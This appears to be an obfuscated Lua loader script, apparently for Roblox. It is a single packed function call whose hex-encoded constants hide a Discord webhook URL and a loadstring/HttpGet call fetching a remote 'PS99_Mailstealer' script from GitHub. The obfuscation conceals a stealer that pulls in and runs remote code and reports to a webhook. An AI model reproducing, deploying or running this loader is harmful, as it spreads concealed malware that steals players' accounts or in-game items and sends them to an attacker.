v15("LOL!1E3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q001840030A3Q00081F377796BDB921153803073Q00CB44705613C5DE026Q00144003063Q0028F2511E284A03083Q00464E9E30764272B6026Q00104003083Q00825A1326B9481B3103043Q0054D72976028Q0003073Q0008F921C525CAD803083Q00A75F9C43AD4AA5B3026Q00F03F03023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333130392Q382Q393430393132382Q3630382F486E664770345F4B58413851346448457A32717A544A5954335F654B357056583538617358724A396F48504C486C41476F484E2D4C5571765241586167574B616C555257030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034D3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B692Q75502F50532Q395F4D61696C737465616C65722F6D61696E2F4D61696C537465616C65722E6C75612Q0100454Q00197Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B000100010004153Q000B0001001211000400063Q002Q20000500040007001211000600083Q002Q20000600060009001211000700083Q002Q2000070007000A00060200083Q000100062Q001B3Q00074Q001B3Q00014Q001B3Q00054Q001B3Q00024Q001B3Q00034Q001B3Q00064Q0003000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B00094Q000900083Q00122Q000A000F3Q00122Q000B00106Q0009000B000200104Q000E00092Q0003000900083Q00122Q000A00123Q00122Q000B00136Q0009000B000200104Q001100094Q000900083Q00122Q000A00153Q00122Q000B00166Q0009000B000200104Q0014000900120C000900143Q00262100090039000100170004153Q00390001001211000A00183Q002008000B3Q001400202Q000A000B001900122Q000A001A3Q00122Q000B001B3Q00202Q000B000B001C00122Q000D001D6Q000B000D6Q000A3Q00024Q000A0001000100044Q004400010026210009002C000100140004153Q002C0001001211000A00183Q00201C000B3Q001100202Q000C3Q000E4Q000A000B000C00122Q000A00183Q00202Q000B3Q000B00202Q000A000B001E00122Q000900173Q00044Q002C00012Q001F3Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q000D00025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100012Q002400076Q0005000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q00010004130003000500012Q0024000300054Q001B000400024Q0023000300044Q001600036Q001F3Q00017Q00",v9(),...);